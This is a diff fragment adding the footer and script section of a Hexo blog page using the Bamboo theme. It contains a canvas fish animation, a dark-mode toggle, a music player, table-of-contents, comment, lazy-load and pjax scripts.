+      this.direction = Math.random() < .5, this.x = this.direction ? this.renderer.width + this.renderer.THRESHOLD : -this.renderer.THRESHOLD, this.previousY = this.y, this.vx = this.getRandomValue(4, 10) * (this.direction ? -1 : 1), this.renderer.reverse ? (this.y = this.getRandomValue(1 * this.renderer.height / 10, 4 * this.renderer.height / 10), this.vy = this.getRandomValue(2, 5), this.ay = this.getRandomValue(.05, .2)) : (this.y = this.getRandomValue(6 * this.renderer.height / 10, 9 * this.renderer.height / 10), this.vy = this.getRandomValue(-5, -2), this.ay = this.getRandomValue(-.2, -.05)), this.isOut = !1, this.theta = 0, this.phi = 0
+    },
+    getRandomValue: function (t, i) {
+      return t + (i - t) * Math.random()
+    },
+    reverseVertical: function () {
+      this.isOut = !this.isOut, this.ay *= -1
+    },
+    controlStatus: function (t) {
+      this.previousY = this.y, this.x += this.vx, this.y += this.vy, this.vy += this.ay, this.renderer.reverse ? this.y > this.renderer.height * this.renderer.INIT_HEIGHT_RATE ? (this.vy -= this.GRAVITY, this.isOut = !0) : (this.isOut && (this.ay = this.getRandomValue(.05, .2)), this.isOut = !1) : this.y < this.renderer.height * this.renderer.INIT_HEIGHT_RATE ? (this.vy += this.GRAVITY, this.isOut = !0) : (this.isOut && (this.ay = this.getRandomValue(-.2, -.05)), this.isOut = !1), this.isOut || (this.theta += Math.PI / 20, this.theta %= 2 * Math.PI, this.phi += Math.PI / 30, this.phi %= 2 * Math.PI), this.renderer.generateEpicenter(this.x + (this.direction ? -1 : 1) * this.renderer.THRESHOLD, this.y, this.y - this.previousY), (this.vx > 0 && this.x > this.renderer.width + this.renderer.THRESHOLD || this.vx < 0 && this.x < -this.renderer.THRESHOLD) && this.init()
+    },
+    render: function (t) {
+      t.save(), t.translate(this.x, this.y), t.rotate(Math.PI + Math.atan2(this.vy, this.vx)), t.scale(1, this.direction ? 1 : -1), t.beginPath(), t.moveTo(-30, 0), t.bezierCurveTo(-20, 15, 15, 10, 40, 0), t.bezierCurveTo(15, -10, -20, -15, -30, 0), t.fill(), t.save(), t.translate(40, 0), t.scale(.9 + .2 * Math.sin(this.theta), 1), t.beginPath(), t.moveTo(0, 0), t.quadraticCurveTo(5, 10, 20, 8), t.quadraticCurveTo(12, 5, 10, 0), t.quadraticCurveTo(12, -5, 20, -8), t.quadraticCurveTo(5, -10, 0, 0), t.fill(), t.restore(), t.save(), t.translate(-3, 0), t.rotate((Math.PI / 3 + Math.PI / 10 * Math.sin(this.phi)) * (this.renderer.reverse ? -1 : 1)), t.beginPath(), this.renderer.reverse ? (t.moveTo(5, 0), t.bezierCurveTo(10, 10, 10, 30, 0, 40), t.bezierCurveTo(-12, 25, -8, 10, 0, 0)) : (t.moveTo(-5, 0), t.bezierCurveTo(-10, -10, -10, -30, 0, -40), t.bezierCurveTo(12, -25, 8, -10, 0, 0)), t.closePath(), t.fill(), t.restore(), t.restore(), this.controlStatus(t)
+    }
+  }, $(function () {
+    RENDERER.init()
+    $('.dark').click(function () {
+      setTimeout(() => {
+        RENDERER.setFishColor();
+        RENDERER.context.fill();
+      });
+    })
+  });
+</script>
+  
+  <div class="footer bg-color">
+    <div class="footer-main">
+      
+        
+          <div class="link">
+            
+          </div>
+        
+      
+        
+          <div class="footer-copyright">
+            <p>Copyright © 2020 - 2025 <a target="_blank" rel="noopener" href="https://github.com/godownio">godownio</a> | Powered by <a target="_blank" rel="noopener" href="https://hexo.io/zh-cn/docs/">Hexo</a> | Theme <a target="_blank" rel="noopener" href="https://github.com/yuang01/theme">Bamboo</a> </p>
+
+          </div>
+        
+      
+        
+          
+            <!-- 不蒜子统计 -->
+            <!-- 不蒜子统计 -->
+<span id="busuanzi_container_site_pv">
+      <i class="fas fa-eye" aria-hidden="true"></i>本站总访问量：<span id="busuanzi_value_site_pv"></span> 次
+</span>
+<span class="post-meta-divider">|</span>
+<span id="busuanzi_container_site_uv" style='display:none'>
+      <i class="fas fa-users" aria-hidden="true"></i>本站访客数：<span id="busuanzi_value_site_uv"></span> 人
+</span>
+
+          
+        
+      
+        
+          <div class="footer-custom">
+            
+          </div>
+        
+      
+    </div>
+  </div>
+
+
+
+    <!-- 渲染暗黑按钮 -->
+    
+      <div class="dark">
+  <div class="dark-content">
+    <i class="fas fa-moon" aria-hidden="true"></i>
+    <!-- <span>关灯</span> -->
+  </div>
+  
+</div>
+
+<script>
+  $(function() {
+    let isDark = JSON.parse(localStorage.getItem('dark'))  || JSON.parse('false');
+    if (isDark) {
+      $(".dark-content").replaceWith(
+          `
+          <div class='dark-content'>
+            <i class="fas fa-lightbulb" aria-hidden="true"></i>
+          </div>
+          `
+        );
+    }
+    $('.dark').click(function() {
+      if ($(document.body).is('.darkModel')) {
+        $(document.body).removeClass('darkModel');
+        localStorage.setItem('dark', false);
+        $(".dark-content").replaceWith(
+          `
+          <div class='dark-content'>
+            <i class="fas fa-moon" aria-hidden="true"></i>
+          </div>
+          `
+        );
+      } else {
+        $(document.body).addClass('darkModel');
+        localStorage.setItem('dark', true);
+        $(".dark-content").replaceWith(
+          `
+          <div class='dark-content'>
+            <i class="fas fa-lightbulb" aria-hidden="true"></i>
+          </div>
+          `
+        );
+      }
+    })
+  })
+</script>
+    
+    <!-- 渲染回到顶部按钮 -->
+    
+      <div class="goTop top-btn-color" pointer>
+  <i class="fas fa-arrow-up" aria-hidden="true"></i>
+</div>
+<script src="/js/goTop.js"></script>
+
+    
+    <!-- 渲染左下角音乐播放器 -->
+    
+      <link rel="stylesheet" href="/js/aplayer/APlayer@1.10.1.min.css">
+<style>
+.aplayer .aplayer-lrc p {
+  
+  font-size: 12px;
+  font-weight: 700;
+  line-height: 16px !important;
+}
+
+.aplayer .aplayer-lrc p.aplayer-lrc-current {
+  
+  font-size: 15px;
+  color: #42b983;
+}
+
+
+</style>
+<meting-js  
+  class=""
+  server="tencent"
+  type="album"
+  id="002VeS6r4L5fLZ"
+  fixed='true'
+  autoplay='false'
+  theme='#42b983'
+  loop='all'
+  order='random'
+  preload='auto'
+  volume='0.7'
+  list-folded='true'
+>
+</meting-js>
+
+<!-- <style>
+  #aplayer {
+    position: fixed;
+    left: 0;
+    bottom: 300px;
+  }
+</style> -->
+<script src="https://unpkg.com/aplayer@1.10.1/dist/APlayer.min.js"></script>
+<script src="https://unpkg.com/meting@2/dist/Meting.min.js"></script>
+    
+
+    <!-- 图片放大 -->
+    
+      <script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui@5.0/dist/fancybox/fancybox.umd.js"></script>
+    
+
+    <!-- 百度解析 -->
+    <!-- Baidu Analytics -->
+
+    <!-- Baidu Push -->
+
+<script>
+    (function () {
+        var bp = document.createElement('script');
+        var curProtocol = window.location.protocol.split(':')[0];
+        if (curProtocol === 'https') {
+            bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
+        } else {
+            bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+        }
+        var s = document.getElementsByTagName("script")[0];
+        s.parentNode.insertBefore(bp, s);
+    })();
+</script>
+
+    
+    <!-- 背景彩带 -->
+    
+      <script type="text/javascript" size="100" alpha='0.4' zIndex="-1" src="/js/ribbon.min.js"></script>
+    
+
+    <script src="/js/utils/index.js"></script>
+    <script src="/js/app.js"></script>
+    
+    <!-- 文章目录所需js -->
+<!-- <link href="/js/tocbot/tocbot.css" rel="stylesheet">
+<script src="/js/tocbot/tocbot.min.js"></script> -->
+
+<script src="https://cdnjs.cloudflare.com/ajax/libs/tocbot/4.18.2/tocbot.min.js"></script>
+
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/tocbot/4.18.2/tocbot.css">
+
+<script>
+  var headerEl = 'h2, h3, h4',  //headers 
+    content = '.post-detail',//文章容器
+    idArr = {};  //标题数组以确定是否增加索引id
+  //add #id
+  var option = {
+    // Where to render the table of contents.
+    tocSelector: '.toc',
+    // Where to grab the headings to build the table of contents.
+    contentSelector: content,
+    // Which headings to grab inside of the contentSelector element.
+    headingSelector: headerEl,
+    scrollSmooth: true,
+    scrollSmoothOffset: -70,
+    // headingsOffset: -($(window).height() * 0.4 - 45),
+    headingsOffset: -($(window).height() * 0.4 - 70),
+    // positionFixedSelector: '.toc-main',
+    // positionFixedClass: 'is-position-fixed',
+    fixedSidebarOffset: 'auto',
+    activeLinkClass: 'is-active-link',
+    orderedList: true,
+    collapseDepth: 6,
+    // onClick: function (e) {},
+  }
+  if ($('.toc').length > 0) {
+
+    $(content).children(headerEl).each(function () {
+      //去除空格以及多余标点
+      var headerId = $(this).text().replace(/[\s|\~|`|\!|\@|\#|\$|\%|\^|\&|\*|\(|\)|\_|\+|\=|\||\|\[|\]|\{|\}|\;|\:|\"|\'|\,|\<|\.|\>|\/|\?|\：|\，|\。]/g, '');
+
+      headerId = headerId.toLowerCase();
+      if (idArr[headerId]) {
+        //id已经存在
+        $(this).attr('id', headerId + '-' + idArr[headerId]);
+        idArr[headerId]++;
+      }
+      else {
+        //id未存在
+        idArr[headerId] = 1;
+        $(this).attr('id', headerId);
+      }
+    });
+
+    document.addEventListener("DOMContentLoaded", function () {
+      tocbot.init(option);
+      mobileTocClick();
+    });
+
+  }
+
+  window.tocScrollFn = function () {
+    return bamboo.throttle(function () {
+      findHeadPosition();
+    }, 100)()
+  }
+  window.addEventListener('scroll', tocScrollFn);
+
+  const findHeadPosition = function (top) {
+    if ($('.toc-list').length <= 0) {
+      return false;
+    }
+    setTimeout(() => {  // or DOMContentLoaded 
+      autoScrollToc();
+    }, 0);
+  }
+
+  const autoScrollToc = function () {
+    const $activeItem = document.querySelector('.is-active-link');
+    const $cardToc = document.querySelector('.toc-content');
+    const activePosition = $activeItem.getBoundingClientRect().top
+    const sidebarScrollTop = $cardToc.scrollTop
+    if (activePosition > (document.documentElement.clientHeight - 100)) {
+      $cardToc.scrollTop = sidebarScrollTop + 150
+    }
+    if (activePosition < 150) {
+      $cardToc.scrollTop = sidebarScrollTop - 150
+    }
+  }
+
+  document.addEventListener('pjax:send', function () {
+    if ($('.toc').length) {
+      tocbot.destroy();
+    }
+  });
+
+  document.addEventListener('pjax:complete', function () {
+    if ($('.toc').length) {
+      tocbot.init(option);
+      mobileTocClick();
+    }
+  });
+  
+  // 手机端toc按钮点击出现目录
+  const mobileTocClick = function () {
+    const $cardTocLayout = document.getElementsByClassName('side_toc')[0];
+    const $cardToc = $cardTocLayout.getElementsByClassName('toc-content')[0];
+    let right = '45px';
+    if (window.innerWidth >= 551 && window.innerWidth <= 992) {
+      right = '100px'
+    }
+    const mobileToc = {
+      open: () => {
+        $cardTocLayout.style.cssText = 'animation: toc-open .3s; opacity: 1; right: ' + right
+      },
+
+      close: () => {
+        $cardTocLayout.style.animation = 'toc-close .2s'
+        setTimeout(() => {
+          $cardTocLayout.style.cssText = "opacity:''; animation: ''; right: ''"
+        }, 100)
+      }
+    }
+    document.getElementById('toc-mobile-btn').addEventListener('click', () => {
+      if (window.getComputedStyle($cardTocLayout).getPropertyValue('opacity') === '0') mobileToc.open()
+      else mobileToc.close()
+    })
+
+    $cardToc.addEventListener('click', (e) => {
+      if (window.innerWidth < 992) { // 小于992px的时候
+        mobileToc.close()
+      }
+    })
+  }
+</script>
+
+<style>
+  /* .is-position-fixed {
+    position: sticky !important;
+    top: 74px;
+  }
+
+  .toc-main ul {
+    counter-reset: show-list;
+  }
+
+  .toc-main ul li::before {
+    content: counter(item)".";
+    display: block;
+    position: absolute;
+    left: 12px;
+    top: 0;
+  } */
+</style>
+ 
+
+<!-- 设置导航背景 -->
+<script>
+  let setHeaderClass = () => {
+    const nav = $('#navHeader');
+    const navTop = nav.outerHeight();
+    const winTop = $(window).scrollTop();
+    if(winTop > navTop) {
+      nav.addClass('header-bg-color');
+    }
+    else {
+      nav.removeClass('header-bg-color');
+    }
+  };
+
+  let scrollCollect = () => {
+    return bamboo.throttle(function (e) {
+      setHeaderClass();
+    }, 200)()
+  }
+
+  let initHeaderBg = () => {
+    setHeaderClass();
+  }
+
+  setHeaderClass();
+  window.addEventListener('scroll', scrollCollect);
+
+  document.addEventListener('pjax:send', function () {
+    window.removeEventListener('scroll', scrollCollect)
+  })
+  document.addEventListener('pjax:complete', function () {
+    window.addEventListener('scroll', scrollCollect);
+    setHeaderClass();
+  })
+</script> 
+
+<!-- 渲染issues标签里的内容 -->
+<script>
+  function loadIssuesJS() {
+    if ($(".post-detail").find(".issues-api").length == 0) {
+      return;
+    } 
+    loadScript('/js/issues/index.js');
+  };
+  $(function () {
+    loadIssuesJS();
+  });
+  document.addEventListener('pjax:complete', function () {
+    if (typeof IssuesAPI == "undefined") {
+      loadIssuesJS();
+    }
+  })
+</script>
+
+<!-- 渲染远程json加载的图片标签(getPhotoOnline)里的内容 -->
+<script>
+  function loadPhotoOnlineJS() {
+    if ($(".post-detail").find(".getJsonPhoto-api").length == 0) {
+      return;
+    } 
+    loadScript('/js/getPhotoOnline/index.js');
+  };
+  $(function () {
+    loadPhotoOnlineJS();
+  });
+  document.addEventListener('pjax:complete', function () {
+    if (typeof getPhotoJson == "undefined") {
+      loadPhotoOnlineJS();
+    }
+  })
+</script>
+
+<!-- 渲染远程json加载的talk标签(getTalkOnline)里的内容 -->
+<script>
+  function loadTalkOnlineJS() {
+    if ($(".post-detail").find(".getJsonTalk-api").length == 0) {
+      return;
+    } 
+    loadScript('https://cdnjs.cloudflare.com/ajax/libs/waterfall.js/1.0.2/waterfall.min.js'); // 瀑布流插件，https://raphamorim.io/waterfall.js/
+    loadScript('/js/getTalkOnline/index.js');
+  };
+  $(function () {
+    loadTalkOnlineJS();
+  });
+  document.addEventListener('pjax:complete', function () {
+    if (typeof getTalkJson == "undefined") {
+      loadTalkOnlineJS();
+    }
+  })
+</script>
+
+<!-- 渲染远程json加载的site-card标签(getSiteOnline)里的内容 -->
+<script>
+  function loadSiteOnlineJS() {
+    if ($(".post-detail").find(".getJsonSite-api").length == 0) {
+      return;
+    } 
+    loadScript('/js/getSiteOnline/index.js');
+  };
+  $(function () {
+    loadSiteOnlineJS();
+  });
+  document.addEventListener('pjax:complete', function () {
+    if (typeof getSiteJson == "undefined") {
+      loadSiteOnlineJS();
+    }
+  })
+</script>
+
+<!-- 输入框打字特效 -->
+<!-- 输入框打字特效 -->
+
+  <script src="/js/activate-power-mode.js"></script>
+  <script>
+    POWERMODE.colorful = true;  // 打开随机颜色特效
+    POWERMODE.shake = false;    // 关闭输入框抖动
+    document.body.addEventListener('input', POWERMODE);//监听打字事件
+  </script>
+
+
+<!-- markdown代码一键复制功能 -->
+
+  <link rel="stylesheet" href="https://unpkg.com/v-plugs-ayu/lib/ayu.css">
+  <script src="https://unpkg.com/v-plugs-ayu/lib/ayu.umd.min.js"></script>
+  <script src="/js/clipboard/clipboard.min.js"></script>
+  <div id="appCopy">
+  </div>
+  <script data-pjax>
+    var vm = new Vue({
+      el: '#appCopy',
+      data: {
+      },
+      computed: {
+      },
+      mounted() {
+        const that = this;
+        var copy = '复制';
+        /* code */
+        var initCopyCode = function () {
+          var copyHtml = '';
+          copyHtml += '<button class="btn-copy" data-clipboard-snippet="" style="position:absolute;top:0;right:0;z-index:1;">';
+          copyHtml += '<i class="fas fa-copy"></i><span>' + copy + '</span>';
+          copyHtml += '</button>';
+          $(".post-detail pre").not('.gutter pre').wrap("<div class='codeBox' style='position:relative;width:100%;'></div>")
+          $(".post-detail pre").not('.gutter pre').before(copyHtml);
+          new ClipboardJS('.btn-copy', {
+            target: function (trigger) {
+              return trigger.nextElementSibling;
+            }
+          });
+        }
+        initCopyCode();
+        $('.btn-copy').unbind('click').bind('click', function () {
+          doSomething();
+        })
+        $(document).unbind('keypress').bind('keypress', function (e) {
+          if (e.ctrlKey && e.keyCode == 67) {
+            doSomething();
+          }
+        })
+
+        function doSomething() {
+          that.$notify({
+            title: "成功",
+            content: "代码已复制，请遵守相关授权协议。",
+            type: 'success'
+          })
+        }
+      },
+      methods: {
+      },
+      created() { }
+    })
+  </script>
+  
+
+<!-- 图片懒加载 -->
+<script defer src="https://unpkg.com/vanilla-lazyload@17.1.0/dist/lazyload.min.js"></script>
+<script>
+  // https://www.npmjs.com/package/vanilla-lazyload
+  // Set the options globally
+  // to make LazyLoad self-initialize
+  window.lazyLoadOptions = {
+    elements_selector: ".lazyload",
+    threshold: 0
+  };
+  // Listen to the initialization event
+  // and get the instance of LazyLoad
+  window.addEventListener(
+    "LazyLoad::Initialized",
+    function (event) {
+      window.lazyLoadInstance = event.detail.instance;
+    },
+    false
+  );
+  document.addEventListener('DOMContentLoaded', function () {
+    lazyLoadInstance.update();
+  });
+  document.addEventListener('pjax:complete', function () {
+    lazyLoadInstance.update();
+  });
+</script>
+
+
+<!-- 卡片滚动动画 -->
+   
+
+<!-- 评论所需js -->
+
+  
+    <script type="text/javascript">
+  var utteranceCommon = {};
+
+  function check_utterance() {
+    let isDark = JSON.parse(localStorage.getItem('dark')) || JSON.parse('false');
+    if (isDark) {
+      utteranceCommon.Theme = 'github-dark';
+    } else {
+      utteranceCommon.Theme = 'github-light';
+    }
+
+    return document.getElementById("gitment-container");
+  }
+  comment_el = '#gitment-container';
+  load_utterance = function () {
+    if ($(comment_el).length) {
+      // 匿名函数，防止污染全局变量
+      const HEAD = check_utterance();
+
+      var utterances = document.createElement('script');
+      utterances.type = 'text/javascript';
+      utterances.async = true;
+      utterances.setAttribute('issue-term', 'pathname')
+      utterances.setAttribute('theme', utteranceCommon.Theme)
+      utterances.setAttribute('repo', 'godownio/godownio.github.io')
+      utterances.crossorigin = 'anonymous';
+      utterances.src = 'https://utteranc.es/client.js';
+      // content 是要插入评论的地方
+      document.getElementById('gitment-container').appendChild(utterances);
+
+    }
+  }
+
+  function dark_utterance() {
+    const HEAD = check_utterance();
+    if (!HEAD) return;
+    const message = {
+      type: 'set-theme',
+      theme: utteranceCommon.Theme
+    };
+    const utteranceIframe = document.querySelector('iframe');
+    utteranceIframe.contentWindow.postMessage(message, 'https://utteranc.es');
+  }
+
+  $(document).ready(load_utterance);
+  document.addEventListener('pjax:complete', function () {
+    load_utterance();
+  });
+
+  $('.dark').click(function () {
+    setTimeout(() => {
+      dark_utterance();
+    });
+  })
+
+</script>
+
+<style>
+  .utterances {
+    max-width: inherit !important;
+  }
+</style>
+  
+
+
+<!-- 鼠标点击特效 -->
+<!-- 爱心点击 -->
+
+  
+    <canvas class="fireworks" style="position: fixed;left: 0;top: 0;z-index: 999; pointer-events: none;" ></canvas>
+    <script src="//cdn.bootcss.com/animejs/2.2.0/anime.min.js"></script>
+    <script src="/js/cursor/explosion.min.js"></script>
+  
+
+
+
+
+  <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" data-pjax></script>
+
+
+<!-- 轮播图标签 -->
+<script>
+  var bambooSwiperTag = {};
+  function load_swiper() {
+    if (!document.querySelectorAll(".post-swiper-container")[0]) return;
+    loadCSS("https://unpkg.com/swiper@6/swiper-bundle.min.css")
+    loadScript("https://unpkg.com/swiper@6/swiper-bundle.min.js").then(() => {
+      pjax_swiper();
+    });
+  }
+
+  load_swiper();
+
+  function pjax_swiper() {
+    bambooSwiperTag.swiper = new Swiper('.post-swiper-container', {
+      slidesPerView: 'auto',
+      spaceBetween: 8,
+      centeredSlides: true,
+      loop: true,
+      autoplay: true ? {
+        delay: 3000,
+        stopOnLastSlide: false,
+        disableOnInteraction: false,
+      } : false,
+      pagination: {
+        el: '.swiper-pagination',
+        clickable: true,
+      },
+      navigation: {
+        nextEl: '.swiper-button-next',
+        prevEl: '.swiper-button-prev',
+      },
+      on:{
+        init: function(){
+          swiperAnimateCache(this); //隐藏动画元素 
+          swiperAnimate(this); //初始化完成开始动画
+        }, 
+        slideChangeTransitionEnd: function(){ 
+          swiperAnimate(this); //每个slide切换结束时也运行当前slide动画
+          //this.slides.eq(this.activeIndex).find('.ani').removeClass('ani'); 动画只展现一次，去除ani类名
+        } 
+      }
+    });
+  }
+
+  document.addEventListener('pjax:complete', function () {
+    if (!document.querySelectorAll(".post-swiper-container")[0]) return;
+    if (typeof bambooSwiperTag.swiper === "undefined") {
+      load_swiper();
+    } else {
+      pjax_swiper();
+    }
+  });
+</script>
+    <!-- pjax -->
+    
+
+<!-- pjax -->
+
+
+  <script src="/js/pjax@0.2.8/index.js"></script>
+  
+    <!-- 样式位于：source/css/_third-party/pjaxanimate.styl -->
+
+<div class="pjax-animate">
+  
+    <div class="loading-circle"><div id="loader-circle"></div></div>
+    <script>
+      window.ShowLoading = function() {
+        $(".loading-circle").css("display", "block");
+      };
+      window.HideLoading = function() {
+        $(".loading-circle").css("display", "none");
+      }
+    </script>
+  
+	<script>
+    document.addEventListener('pjax:complete', function () {
+      window.HideLoading();
+    })
+    document.addEventListener('pjax:send', function () {
+      window.ShowLoading();
+    })
+    document.addEventListener('pjax:error', function () {
+      window.HideLoading();
+    })
+	</script>
+</div>
+
+  
+
+  <script>
+    var pjax = new Pjax({
+      elements: 'a[href]:not([href^="#"]):not([href="javascript:void(0)"]):not([no-pjax])',   // 拦截正常带链接的 a 标签
+      selectors: ["#pjax-container","title"],                                   // 根据实际需要确认重载区域
+      cacheBust: false,   // url 地址追加时间戳，用以避免浏览器缓存
+      timeout: 5000
+    });
+
+    document.addEventListener('pjax:send', function (e) {
+
+      try {
+        var currentUrl = window.location.pathname;
+        var targetUrl = e.triggerElement.href;
+        var banUrl = [""];
+        if (banUrl[0] != "") {
+          banUrl.forEach(item => {
+            if(currentUrl.indexOf(item) != -1 || targetUrl.indexOf(item) != -1) {
+              window.location.href = targetUrl;
+            }
+          });
+        }
+      } catch (error) {}
+
+      $(window).unbind('resize');
+      $(window).unbind('scroll');
+      $(document).unbind('scroll');
+      $(document).unbind('click');
+      $('body').unbind('click');
+
+    })
+    
+    document.addEventListener('pjax:complete', function () {
+      $('script[data-pjax], .pjax-reload script').each(function () {
+        $(this).parent().append($(this).remove());
+      });
+    });
+
+    document.addEventListener('pjax:error', function (e) {
+      window.location.href = e.triggerElement.href;
+    })
+    
+    // 刷新不从顶部开始
+    document.addEventListener("DOMContentLoaded", function () {
+      history.scrollRestoration = 'auto';
+    })
+  </script>
+
+
+
+  </body>
+</html>
